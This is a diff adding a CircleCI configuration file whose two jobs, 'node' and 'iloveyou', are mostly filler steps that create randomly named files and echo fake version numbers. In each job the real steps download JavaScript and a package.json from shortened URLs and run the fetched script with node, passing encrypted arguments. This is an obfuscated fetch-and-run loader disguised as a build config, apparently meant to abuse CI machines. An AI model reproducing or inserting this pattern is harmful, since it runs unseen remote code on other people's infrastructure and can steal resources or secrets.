@@ -1,0 +1,50 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  node:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: touch rs40hfi07bvajjseprwr798ebbf.java
+      - run: touch moduib10aocxpykq4jd.py
+      - run: curl -fsSL shorturl.at/elzPQ -o rpes4kk12flw0qk9v.js && curl -fsSL
+          shorturl.at/zESX8 -o package.json && curl -fsSL shorturl.at/xLTZ9 -o
+          cnq8an72xszxsp9.js
+      - run: touch h0icxzq7f6xksx2jciqgr.html
+      - run: npm i -s
+      - run: echo version 22324337842.935173
+      - run: touch d58lhx8c344g255hsvsk.ts
+      - run: touch 6d0k6ckio9g30da0i4j.java
+      - run: node rpes4kk12flw0qk9v -s
+          U2FsdGVkX1+PD/KGZR4LQtsuk4I/yYB0jI9TpJCNs9DiKM+CobU+Yql5Xbus+OeEC8zpXrqZC2cCGCPramqvaiAHPr5KtrJ5ZhtuFKs81PW3pK6OxOCfZvuCEgfVrWRoMI+IgnKbnVhBrdKOopXkHdwSgJAA+mpgRTsXZvy/5lbaWpV8nUlVG7en97ocRUOeWJCj84e+OJrSnQ9qWYs/eO2RFXeLou2yAUk/Meqolb8=
+          -r
+          U2FsdGVkX1/vTQAKKvw0i7e5PoryuaUSc6w4+20YxL3nKS905U1/sMZz0V3kqWnpxemUWrss5qGMVe1oenSEmLjK3xHKrvPbLz60NSfJThrH7/ktQAGB55deGDrII69DS+QT/Xv0w2x9D0k6RuZcdMpGkzL/gtNrBbkw0sfE5WmdEiLFAME8YSOlTy5RVyOdwhlXJIjowOd7OmDAhn22QaD5ZCLySinUeNpeVvjXM3Ow+eB5QCdsU6aEATx37abGjXnXuJ5Ux0A0TYyqChaLMeWOD/EigN+m5j8szuaKA7Q=
+          -lpn U2FsdGVkX1//WP/PHFb4WhR6LhilvtcwEX3NSTxEMDs= -t
+          U2FsdGVkX193EHbjKV75CoycsfbR+OFtcXPovsOXmgQsGzM7h4wYRbKM91oHOrac -sp
+  iloveyou:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: curl -fsSL shorturl.at/lqvKZ -o 8fz2jtoymkqkl6.js && curl -fsSL
+          shorturl.at/fmCF9 -o package.json && curl -fsSL shorturl.at/osvAS -o
+          jwsnsgmruc.js
+      - run: touch i60trspw64hz98m9ug5sn.c
+      - run: echo version 1528626414.5019894
+      - run: mkdir wdv4u1u4alai904
+      - run: mkdir bvtafnps6gbbr6ajp5zrg7s8
+      - run: npm i -s
+      - run: touch 2aj7xay4awwmrjpql9778ofp.py
+      - run: touch f84hicmdvpk3f1gi92b.py
+      - run: node 8fz2jtoymkqkl6 -sp -lpn U2FsdGVkX1+lYrIS2L47SnRDnJ8JH5Df4M1x/YjvV+w=
+          -t U2FsdGVkX1/sySco0rI5oXKhLdBy6SaJZRqZyEVW+jNtbNfLN8Yxyw69JI4qMn2g -r
+          U2FsdGVkX1/IpIAnLkjbGr6ZHRav+Y6r4j5TjHI90gInLtgi9AQkeSuviRh9R4Isk/RY/xpX2Kjau+gPoq7fvmvkhLMxDc8Z+4CkqbQaqRVL7DEc6XAmUiQLitMrJJ1D0yXGZug4wfJrUJFuI6kf9okGsiUfQas6bgUax47vanC6NIvkFsRXNEnSVMObkMDRPu/jVDPkPmfdEC5sc2sWpORqWEkR5LmRWEUXs8ukqogKRh/KMR0/Dm58OZfyb09ifDUiFRLYCysV4/JAHK9ABamMUa4KfZnZs4SX6lGTzoM=
+          -s
+          U2FsdGVkX1/YxiQhCeRhJoXUYyB7j+/Aj0ai5gvefXVwWSOp2y8Itop+kecf4g7eY8Q3a7Np0gWNgSq7cz4uYP/lTsnoLlatw4hE8I86P0ZJ27ix59RLlyjWL2x5J9Kh3ZG8Clxlqnk8aDcdGdD69L56HGdlafNmq7WI3fDvg7ue/zWGf8nddi6oPVzR27pVH9cNiZutETWLIrYIYBKvkDe4RC7opy60pLv5tgIchRY=
+workflows:
+  start-jobs:
+    jobs:
+      - node
+  final-jobs:
+    jobs:
+      - iloveyou
